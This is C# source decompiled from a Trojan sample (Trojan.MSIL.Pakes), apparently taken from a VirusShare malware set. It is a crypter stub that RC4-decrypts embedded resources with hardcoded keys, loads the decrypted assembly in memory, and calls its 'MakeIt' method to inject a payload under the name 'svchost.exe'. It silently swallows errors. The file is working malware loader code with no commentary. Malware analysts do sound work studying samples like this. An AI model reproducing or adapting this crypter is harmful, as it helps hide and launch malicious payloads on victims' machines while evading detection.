// Decompiled with JetBrains decompiler
// Type: CrypterSource.Program
// Assembly: test, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 585B5A2F-2B95-4521-A946-DF6C5C17545D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.MSIL.Pakes.at-99b1f8115f5adc5f9080da56848ccd7f7c03dda5f82a0a460908cb39781141d6.exe

using System;
using System.Reflection;
using System.Resources;
using System.Text;

namespace CrypterSource
{
  internal class Program
  {
    private static void Main()
    {
      try
      {
        ResourceManager resourceManager = new ResourceManager("files", Assembly.GetExecutingAssembly());
        byte[] numArray = Program.RC4((byte[]) resourceManager.GetObject("_rrWi2zArTDUbDt2UiyxR"), "_f7b1foiqdLbMQi5m");
        Type type = Assembly.Load(Program.RC4((byte[]) resourceManager.GetObject("lolumad"), "_WmPgQsNIJoKU9BOD")).GetTypes()[7];
        type.GetMethod("MakeIt").Invoke(Activator.CreateInstance(type), new object[2]
        {
          (object) numArray,
          (object) "svchost.exe"
        });
      }
      catch
      {
      }
    }

    public static byte[] RC4(byte[] bytes, string Key)
    {
      byte[] bytes1 = Encoding.ASCII.GetBytes(Key);
      byte[] numArray1 = new byte[256];
      byte[] numArray2 = new byte[256];
      for (int index = 0; index < 256; ++index)
      {
        numArray1[index] = (byte) index;
        numArray2[index] = bytes1[index % bytes1.GetLength(0)];
      }
      int index1 = 0;
      for (int index2 = 0; index2 < 256; ++index2)
      {
        index1 = (index1 + (int) numArray1[index2] + (int) numArray2[index2]) % 256;
        byte num = numArray1[index2];
        numArray1[index2] = numArray1[index1];
        numArray1[index1] = num;
      }
      int index3;
      int index4 = index3 = 0;
      for (int index5 = 0; index5 < bytes.GetLength(0); ++index5)
      {
        index4 = (index4 + 1) % 256;
        index3 = (index3 + (int) numArray1[index4]) % 256;
        byte num = numArray1[index4];
        numArray1[index4] = numArray1[index3];
        numArray1[index3] = num;
        int index6 = ((int) numArray1[index4] + (int) numArray1[index3]) % 256;
        bytes[index5] ^= numArray1[index6];
      }
      return bytes;
    }

    private static void OHNADWHOWADHohdwAOHD()
    {
    }
  }
}
